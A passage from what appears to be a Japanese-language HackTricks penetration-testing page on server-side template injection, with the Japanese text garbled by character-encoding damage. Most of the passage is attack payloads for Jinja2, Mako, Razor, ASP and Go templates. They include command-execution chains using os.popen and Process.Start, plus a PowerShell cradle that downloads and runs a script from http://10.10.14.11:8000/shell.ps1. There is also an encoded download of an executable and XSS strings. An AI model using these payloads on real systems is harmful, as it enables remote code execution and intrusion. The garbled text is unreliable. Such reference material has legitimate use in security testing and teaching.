{{os.system('whoami')}}
```
**è©³ç´°æƒ…å ±**

### Jinja2ï¼ˆPythonï¼‰

[å…¬å¼ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ](http://jinja.pocoo.org)

> Jinja2ã¯Pythonã®ãƒ•ãƒ«æ©Ÿèƒ½ã‚’å‚™ãˆãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã™ã€‚å®Œå…¨ãªUnicodeã‚µãƒãƒ¼ãƒˆã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®çµ±åˆã•ã‚ŒãŸã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹å®Ÿè¡Œç’°å¢ƒã€åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹BSDãƒ©ã‚¤ã‚»ãƒ³ã‚¹ãŒã‚ã‚Šã¾ã™ã€‚

* `{{7*7}} = ã‚¨ãƒ©ãƒ¼`
* `${7*7} = ${7*7}`
* `{{foobar}} ä½•ã‚‚ã‚ã‚Šã¾ã›ã‚“`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå½¢å¼**

Jinja2ã¯ã€Pythonã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã‚ã‚Šã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®é–‹ç™ºã«åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¯ã€HTMLã‚„XMLãªã©ã®ãƒãƒ¼ã‚¯ã‚¢ãƒƒãƒ—è¨€èªã¨çµ„ã¿åˆã‚ã›ã¦ä½¿ç”¨ã•ã‚Œã€å‹•çš„ãªã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¯ã€ç‰¹å®šã®æ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦å¤‰æ•°ã€åˆ¶å¾¡æ§‹é€ ã€ãƒ•ã‚£ãƒ«ã‚¿ã€ãƒã‚¯ãƒ­ãªã©ã‚’è¡¨ç¾ã—ã¾ã™ã€‚ä»¥ä¸‹ã«ã€Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®åŸºæœ¬çš„ãªæ§‹æ–‡ã‚’ç¤ºã—ã¾ã™ã€‚

- å¤‰æ•°ã®è¡¨ç¤º: `{{ variable }}`
- åˆ¶å¾¡æ§‹é€ ï¼ˆifæ–‡ã€forãƒ«ãƒ¼ãƒ—ãªã©ï¼‰: `{% control_structure %}`
- ãƒ•ã‚£ãƒ«ã‚¿ã®é©ç”¨: `{{ variable | filter }}`
- ãƒã‚¯ãƒ­ã®å®šç¾©: `{% macro macro_name() %} ... {% endmacro %}`

Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¯ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹ãŸã‚ã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆSSTIï¼‰æ”»æ’ƒã®æ½œåœ¨çš„ãªè„†å¼±æ€§ã¨ãªã‚Šå¾—ã¾ã™ã€‚SSTIæ”»æ’ƒã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå…¥åŠ›ã—ãŸãƒ‡ãƒ¼ã‚¿ãŒãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã«ç›´æ¥æ¸¡ã•ã‚Œã€å®Ÿè¡Œã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã€ã‚·ã‚¹ãƒ†ãƒ ã«æ·±åˆ»ãªå½±éŸ¿ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

SSTIæ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’è¬›ã˜ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

- ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã†ã€‚
- ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€è¨±å¯ã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå¤‰æ•°ã‚„é–¢æ•°ã®ã¿ã‚’ä½¿ç”¨ã™ã‚‹ã€‚
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ‘ãƒƒãƒã‚„ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã‚’å®šæœŸçš„ã«é©ç”¨ã™ã‚‹ã€‚

ä»¥ä¸ŠãŒJinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®åŸºæœ¬çš„ãªæ§‹æ–‡ã¨SSTIæ”»æ’ƒã¸ã®å¯¾ç­–ã§ã™ã€‚å®‰å…¨ãªWebã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®é–‹ç™ºã«ãŠã„ã¦ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®é©åˆ‡ãªä½¿ç”¨ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã®å®Ÿæ–½ãŒé‡è¦ã§ã™ã€‚
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**`__builtins__`ã«ä¾å­˜ã—ãªã„RCE**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/)ï¼š

```markdown
ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦ã€`__builtins__`ã«ä¾å­˜ã—ãªã„ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼ˆRCEï¼‰ã‚’å®Ÿç¾ã—ã¾ã™ã€‚

## æ¦‚è¦

Jinja2ã¯ã€Pythonã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã‚ã‚Šã€å¤šãã®Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§Pythonã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®æ©Ÿèƒ½ã‚’æä¾›ã—ã¾ã™ã€‚ã—ã‹ã—ã€ã“ã®æ©Ÿèƒ½ã¯æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã¯ã€Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã—ã¦ã€`__builtins__`ã«ä¾å­˜ã—ãªã„RCEã‚’å®Ÿç¾ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## è„†å¼±æ€§ã®è©³ç´°

Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§Pythonã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®`{{ ... }}`ã‚¿ã‚°ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚é€šå¸¸ã€ã“ã®ã‚¿ã‚°ã¯ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®å¤‰æ•°ã‚’è¡¨ç¤ºã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ãŒã€æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ä»»æ„ã®Pythonã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

1. æ”»æ’ƒè€…ã¯ã€è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚
2. ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã«ä»»æ„ã®Pythonã‚³ãƒ¼ãƒ‰ã‚’åŸ‹ã‚è¾¼ã¿ã¾ã™ã€‚
3. æ”»æ’ƒè€…ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è¦æ±‚ã—ã¾ã™ã€‚
4. ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®Pythonã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã€æ”»æ’ƒè€…ãŒæŒ‡å®šã—ãŸã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã¯ã€`__builtins__`ã«ä¾å­˜ã—ãªã„ãŸã‚ã€ä¸€éƒ¨ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ï¼ˆä¾‹ï¼š`__builtins__`ã®ç„¡åŠ¹åŒ–ï¼‰ãŒæœ‰åŠ¹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯éå¸¸ã«å±é™ºã§ã‚ã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é‡å¤§ãªè„…å¨ã‚’ã‚‚ãŸã‚‰ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## å¯¾ç­–æ–¹æ³•

ã“ã®è„†å¼±æ€§ã‚’é˜²ããŸã‚ã«ã¯ã€ä»¥ä¸‹ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

- Jinja2ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã€‚
- ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’é©åˆ‡ã«æ¤œè¨¼ã—ã€ä¿¡é ¼ã§ãã‚‹ãƒ‡ãƒ¼ã‚¿ã®ã¿ã‚’ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ¸¡ã™ã€‚
- ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã§ã®Pythonã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã‚’åˆ¶é™ã™ã‚‹ã€‚
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆï¼ˆãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆï¼‰ã‚’å®šæœŸçš„ã«å®Ÿæ–½ã—ã€è„†å¼±æ€§ã‚’ç‰¹å®šã—ã¦ä¿®æ­£ã™ã‚‹ã€‚

ã“ã‚Œã‚‰ã®å¯¾ç­–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€Jinja2ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®RCEã«ã‚ˆã‚‹æ”»æ’ƒã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
```
```html
<div class="text-center">
  <img src="https://podalirius.net/images/jinja2-logo.png" alt="Jinja2 Logo">
</div>
```
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinjaã®æ‚ªç”¨æ–¹æ³•ã®è©³ç´°**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= æˆåŠŸ`
* `@() <= æˆåŠŸ`
* `@("{{code}}") <= æˆåŠŸ`
* `@ <= æˆåŠŸ`
* `@{} <= ã‚¨ãƒ©ãƒ¼ï¼`
* `@{ <= ã‚¨ãƒ©ãƒ¼ï¼`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NETã®`System.Diagnostics.Process.Start`ãƒ¡ã‚½ãƒƒãƒ‰ã¯ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ä»»æ„ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’èµ·å‹•ã—ã€ã‚¦ã‚§ãƒ–ã‚·ã‚§ãƒ«ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚è„†å¼±ãªã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã®ä¾‹ã¯ã€[https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**è©³ç´°æƒ…å ±**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nothing
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**è©³ç´°æƒ…å ±**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojoliciousï¼ˆPerlï¼‰

Perlã§ã‚ã£ã¦ã‚‚ã€Rubyã®ERBã®ã‚ˆã†ãªã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

* `<%= 7*7 %> = 49`
* `<%= foobar %> = ã‚¨ãƒ©ãƒ¼`
```
<%= perl code %>
<% perl code %>
```
### GOã«ãŠã‘ã‚‹SSTI

ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ãŒGoã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹æ–¹æ³•ã¯ã€æ¬¡ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* `{{ . }}` = ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ¸¡ã•ã‚Œã‚‹å…¥åŠ›ãƒ‡ãƒ¼ã‚¿ã®ãƒ‡ãƒ¼ã‚¿æ§‹é€ 
* æ¸¡ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ãŒã€ä¾‹ãˆã°å±æ€§Passwordã‚’å«ã‚€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã§ã‚ã‚‹å ´åˆã€å‰è¿°ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ãã‚Œã‚’æ¼æ´©ã•ã›ã¾ã™ãŒã€`{{ .Password }}`ã®ã‚ˆã†ã«ã‚‚ã§ãã¾ã™
* `{{printf "%s" "ssti" }}` = å¿œç­”ã«æ–‡å­—åˆ—sstiã‚’å‡ºåŠ›ã™ã‚‹ã¯ãšã§ã™
* `{{html "ssti"}}`, `{{js "ssti"}}` = ã“ã‚Œã‚‰ã¯ã€æœ«å°¾ã®å˜èª"js"ã‚„"html"ãªã—ã§æ–‡å­—åˆ—"ssti"ã‚’å‡ºåŠ›ã™ã‚‹ã„ãã¤ã‹ã®ä»–ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™ã€‚ã‚¨ãƒ³ã‚¸ãƒ³ã®[ã“ã“](https://golang.org/pkg/text/template)ã§ã•ã‚‰ã«ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’å‚ç…§ã§ãã¾ã™ã€‚

**XSSã®æ‚ªç”¨**

ã‚µãƒ¼ãƒãƒ¼ãŒ**text/template**ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€XSSã¯å˜ã«å…¥åŠ›ã¨ã—ã¦**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’æä¾›ã™ã‚‹ã“ã¨ã§éå¸¸ã«ç°¡å˜ã«é”æˆã§ãã¾ã™ã€‚ãŸã ã—ã€**html/template**ã®å ´åˆã¯ã€å¿œç­”ã‚’HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¾ã™ï¼š`{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

ãŸã ã—ã€Goã§ã¯**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å®šç¾©**ã—ã¦ã‹ã‚‰**å¾Œã§å‘¼ã³å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**RCEã®æ‚ªç”¨**

html/templateãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯[ã“ã¡ã‚‰](https://golang.org/pkg/html/template/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€text/templateãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯[ã“ã¡ã‚‰](https://golang.org/pkg/text/template/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã—ã¦ã€ã¯ã„ã€ãã‚Œã‚‰ã¯ã‹ãªã‚Šç•°ãªã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€**text/template**ã§ã¯ã€ã€Œcallã€å€¤ã‚’ä½¿ç”¨ã—ã¦ç›´æ¥ä»»æ„ã®å…¬é–‹é–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ãŒã€html/templateã§ã¯ãã†ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

SSTIã‚’ä»‹ã—ã¦Goã§RCEã‚’è¦‹ã¤ã‘ãŸã„å ´åˆã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã«æ¸¡ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«`{{ . }}`ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãªã‚‹ã ã‘ã§ãªãã€**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™**ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ¸¡ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ã€æŒ‡å®šã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹Systemã¨ã„ã†ãƒ¡ã‚½ãƒƒãƒ‰ãŒã‚ã‚‹ã¨æƒ³åƒã—ã¦ã¿ã¦ãã ã•ã„ã€‚ãã‚Œã‚’æ¬¡ã®ã‚ˆã†ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š`{{ .System "ls" }}`\
ã—ãŸãŒã£ã¦ã€ãŠãã‚‰ã**ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒå¿…è¦**ã«ãªã‚‹ã§ã—ã‚‡ã†ã€‚ãã®ã‚ˆã†ãªã‚‚ã®ã®æ½œåœ¨çš„ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**è©³ç´°æƒ…å ±**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### ãã®ä»–ã®æ”»æ’ƒæ‰‹æ³•

ä»–ã®æ”»æ’ƒæ‰‹æ³•ã«ã¤ã„ã¦ã¯ã€[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚ã¾ãŸã€èˆˆå‘³æ·±ã„ã‚¿ã‚°æƒ…å ±ã¯[https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## é–¢é€£ã™ã‚‹ãƒ˜ãƒ«ãƒ—

å½¹ç«‹ã¤ã¨æ€ã‚ã‚Œã‚‹å ´åˆã¯ã€ä»¥ä¸‹ã‚’èª­ã‚“ã§ãã ã•ã„ï¼š

* [Flaskã®ãƒˆãƒªãƒƒã‚¯](../../network-services-pentesting/pentesting-web/flask.md)
* [Pythonã®ãƒã‚¸ãƒƒã‚¯é–¢æ•°](broken-reference/)

## ãƒ„ãƒ¼ãƒ«

{% embed url="https://github.com/epinna/tplmap" %}

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ¤œå‡ºãƒªã‚¹ãƒˆ

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## ç·´ç¿’ã¨å‚è€ƒ

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚æŠ€è¡“çš„ãªçŸ¥è­˜ã‚’ä¿ƒé€²ã™ã‚‹ã“ã¨ã‚’ä½¿å‘½ã¨ã—ã¦ã„ã‚‹ã“ã®ä¼šè­°ã¯ã€ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ã®æ´»ç™ºãªäº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

